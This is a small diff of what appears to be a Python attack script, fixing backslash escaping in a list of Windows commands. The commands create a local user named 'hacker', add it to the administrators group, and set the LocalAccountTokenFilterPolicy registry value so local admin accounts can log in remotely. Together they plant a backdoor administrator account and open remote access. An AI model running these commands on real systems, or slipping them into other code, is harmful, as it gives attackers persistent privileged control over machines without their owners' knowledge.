@@ -41,7 +41,7 @@ PASSWORD = "admin"
 ACTIONS = [
     {"name": "adduser", "command": "net user hacker SetThisFirst! /add"},
     {"name": "makeadmin", "command": "net localgroup administrators hacker /add"},
-    {"name": "modifyreg", "command": "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"}
+    {"name": "modifyreg", "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"}
 ]
 
 # Authentication
